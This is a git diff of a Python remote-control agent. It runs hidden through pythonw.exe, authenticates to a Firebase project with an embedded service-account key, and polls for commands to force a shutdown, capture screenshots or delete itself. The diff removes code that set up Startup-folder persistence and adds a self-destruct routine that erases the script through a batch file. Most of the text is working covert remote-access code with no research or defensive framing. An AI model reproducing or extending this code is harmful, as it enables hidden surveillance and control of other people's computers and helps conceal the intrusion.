@@ -176,9 +176,8 @@ def send_system_info():
 if __name__ == "__main__":
     send_system_info()
 
+
 # --- 1. CONFIGURATION ---
-# The script will handle this key, store it in the Windows Registry, 
-# and use it to connect to Firebase.
 JSON_DATA = {
   "type": "service_account",
   "project_id": "hazack-430e9",
@@ -193,31 +192,28 @@ JSON_DATA = {
   "universe_domain": "googleapis.com"
 }
 
-# --- 2. INSTALLATION & HIDING ---
-def run_hidden():
-    if sys.executable.endswith("python.exe"):
-        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-        os.startfile(f'"{pythonw}" "{os.path.realpath(__file__)}"')
-        sys.exit()
-
-def install_self():
-    # Save key to registry and create startup link
-    key_str = json.dumps(JSON_DATA)
-    os.system(f'setx FIREBASE_KEY "{key_str}" /M')
-    startup = winshell.startup()
-    link = os.path.join(startup, "Agent.lnk")
-    if not os.path.exists(link):
-        shell = win32com.client.Dispatch("WScript.Shell")
-        shortcut = shell.CreateShortCut(link)
-        shortcut.Targetpath = sys.executable.replace("python.exe", "pythonw.exe")
-        shortcut.Arguments = f'"{os.path.realpath(__file__)}"'
-        shortcut.save()
+# --- 2. DESTRUCTION LOGIC ---
+def self_destruct():
+    # Remove from Startup
+    link = os.path.join(winshell.startup(), "Agent.lnk")
+    if os.path.exists(link): os.remove(link)
+    
+    # Kill process and delete this file
+    path_to_script = os.path.realpath(__file__)
+    # Batch file to delete the script after a delay
+    with open("cleanup.bat", "w") as f:
+        f.write(f'timeout /t 2 >nul\ndel "{path_to_script}"\ndel "%~f0"')
+    
+    os.startfile("cleanup.bat")
+    sys.exit()
 
 # --- 3. MAIN AGENT ---
 if __name__ == "__main__":
-    run_hidden()
-    if os.environ.get("FIREBASE_KEY") is None: install_self()
-    
+    # Check if we should be hidden (run via pythonw.exe)
+    if sys.executable.endswith("python.exe"):
+        os.startfile(f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{os.path.realpath(__file__)}"')
+        sys.exit()
+
     cred = credentials.Certificate(JSON_DATA)
     firebase_admin.initialize_app(cred)
     db = firestore.client()
@@ -227,11 +223,16 @@ if __name__ == "__main__":
         try:
             ref.set({'status': 'online'}, merge=True)
             doc = ref.get().to_dict()
-            if doc and doc.get('command') == 'shutdown':
+            cmd = doc.get('command') if doc else None
+            
+            if cmd == 'shutdown':
                 ref.update({'command': None})
                 os.system("shutdown /s /f /t 0")
-            elif doc and doc.get('command') == 'screenshot':
+            elif cmd == 'screenshot':
                 pyautogui.screenshot().save("last.png")
                 ref.update({'command': None})
+            elif cmd == 'delete_key':
+                self_destruct() # The full self-destruct
+                
         except: pass
         time.sleep(10)
